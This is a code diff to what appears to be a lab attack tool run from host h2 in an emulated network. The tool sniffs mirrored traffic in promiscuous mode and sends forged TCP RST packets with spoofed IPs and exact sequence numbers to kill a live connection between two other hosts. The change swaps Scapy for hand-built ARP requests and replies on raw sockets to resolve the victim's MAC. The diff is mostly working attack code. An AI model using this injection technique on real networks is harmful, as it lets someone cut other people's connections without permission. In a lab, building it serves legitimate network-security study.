@@ -7,13 +7,15 @@ exact match, per RFC 5961 -- accepted immediately, no challenge ACK).
 Run on h2 with mirror_enable.sh already applied and a stream active
 between h1 and h3.
 
-Uses raw AF_PACKET sockets, not Scapy, for both send and receive: an
-earlier Scapy-based version's per-packet overhead was close to or above
-the ~24ms real-segment gap, causing an unbounded processing backlog once
-a shot was slow. Packet fields that never change (MACs, spoofed IPs) are
-precomputed once; only the TCP seq/checksum are rebuilt per shot. The
-main loop also always processes the newest queued frame, not the oldest,
-so a transient slowdown can't compound.
+Uses raw AF_PACKET sockets, not any packet-crafting library, for every
+frame this tool sends or reads -- the ARP request/reply used to resolve
+h1's MAC, and the forged RST itself. An earlier Scapy-based version's
+per-packet overhead was close to or above the ~24ms real-segment gap,
+causing an unbounded processing backlog once a shot was slow. Packet
+fields that never change (MACs, spoofed IPs) are precomputed once; only
+the TCP seq/checksum are rebuilt per shot. The main loop also always
+processes the newest queued frame, not the oldest, so a transient
+slowdown can't compound.
 """
 
 import os
@@ -22,19 +24,19 @@ import struct
 import sys
 import time
 
-from scapy.all import srp, Ether, ARP
-
 # SNIFF_IFACE is h2's mirror-fed monitor port; SEND_IFACE is its normal
 # port. Mirroring onto SEND_IFACE broke its own outgoing traffic, so the
 # two roles are split across separate interfaces.
 SNIFF_IFACE = "h2-eth1"
 SEND_IFACE = "h2-eth0"
 
+ATTACKER_IP = "10.0.1.20"
 CLIENT_IP = "10.0.1.10"
 SERVER_IP = "10.0.2.10"
 SERVER_PORT = 8000
 
 ETH_P_IP = 0x0800
+ETH_P_ARP = 0x0806
 ETH_P_ALL = 0x0003
 
 TCP_FIN, TCP_SYN, TCP_RST, TCP_PSH, TCP_ACK, TCP_URG = 0x01, 0x02, 0x04, 0x08, 0x10, 0x20
@@ -82,18 +84,65 @@ def flags_to_str(flags):
     return s or "-"
 
 
+def build_arp_request(own_mac):
+    """Hand-built ARP request (broadcast): "who has CLIENT_IP, tell
+    ATTACKER_IP" -- 14-byte Ethernet header + 28-byte ARP payload."""
+    eth = struct.pack("!6s6sH", b"\xff" * 6, mac_to_bytes(own_mac), ETH_P_ARP)
+    arp = struct.pack(
+        "!HHBBH6s4s6s4s",
+        1, ETH_P_IP, 6, 4, 1,  # hw=Ethernet, proto=IPv4, sizes, opcode=request
+        mac_to_bytes(own_mac), socket.inet_aton(ATTACKER_IP),
+        b"\x00" * 6, socket.inet_aton(CLIENT_IP),
+    )
+    return eth + arp
+
+
+def parse_arp_reply(frame):
+    """Sender MAC (string) if `frame` is an ARP reply from CLIENT_IP, else None."""
+    if len(frame) < 14 + 28:
+        return None
+    if struct.unpack("!H", frame[12:14])[0] != ETH_P_ARP:
+        return None
+    _hw, _proto, _hs, _ps, opcode, sender_mac, sender_ip, _tm, _ti = struct.unpack(
+        "!HHBBH6s4s6s4s", frame[14:14 + 28]
+    )
+    if opcode != 2 or socket.inet_ntoa(sender_ip) != CLIENT_IP:
+        return None
+    return ":".join(f"{b:02x}" for b in sender_mac)
+
+
 def resolve_client_mac():
-    # srp() is bound explicitly to SEND_IFACE -- Scapy's getmacbyip()
-    # picks its own interface via routing-table detection, which picked
-    # the wrong one inside this network namespace. One-time cost, so
-    # Scapy overhead here doesn't matter.
-    global CLIENT_MAC
-    req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=CLIENT_IP)
-    answered, _ = srp(req, iface=SEND_IFACE, timeout=3, retry=2, verbose=False)
-    if not answered:
-        sys.exit(f"[attacker] could not resolve MAC for {CLIENT_IP} on {SEND_IFACE} -- is h1 up and reachable?")
-    CLIENT_MAC = answered[0][1].hwsrc
-    print(f"[attacker] resolved {CLIENT_IP} -> {CLIENT_MAC}")
+    # Hand-rolled ARP over a raw socket bound to SEND_IFACE -- avoids
+    # relying on any library's own interface/routing detection.
+    global CLIENT_MAC, OWN_MAC
+    OWN_MAC = get_own_mac(SEND_IFACE)
+
+    send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
+    send_sock.bind((SEND_IFACE, 0))
+    recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
+    recv_sock.bind((SEND_IFACE, 0))
+    recv_sock.settimeout(0.5)
+
+    request = build_arp_request(OWN_MAC)
+    for _attempt in range(6):
+        send_sock.send(request)
+        deadline = time.time() + 0.5
+        while time.time() < deadline:
+            try:
+                frame = recv_sock.recv(65535)
+            except socket.timeout:
+                break
+            mac = parse_arp_reply(frame)
+            if mac:
+                CLIENT_MAC = mac
+                send_sock.close()
+                recv_sock.close()
+                print(f"[attacker] resolved {CLIENT_IP} -> {CLIENT_MAC}")
+                return
+
+    send_sock.close()
+    recv_sock.close()
+    sys.exit(f"[attacker] could not resolve MAC for {CLIENT_IP} on {SEND_IFACE} -- is h1 up and reachable?")
 
 
 def checksum16(data):
@@ -221,8 +270,7 @@ def handle(frame, send_sock, eth_ip_template):
 
 
 if __name__ == "__main__":
-    resolve_client_mac()
-    OWN_MAC = get_own_mac(SEND_IFACE)
+    resolve_client_mac()  # also sets OWN_MAC
 
     # Mirrored frames aren't addressed to h2's MAC -- needs promiscuous mode.
     os.system(f"ip link set {SNIFF_IFACE} promisc on")
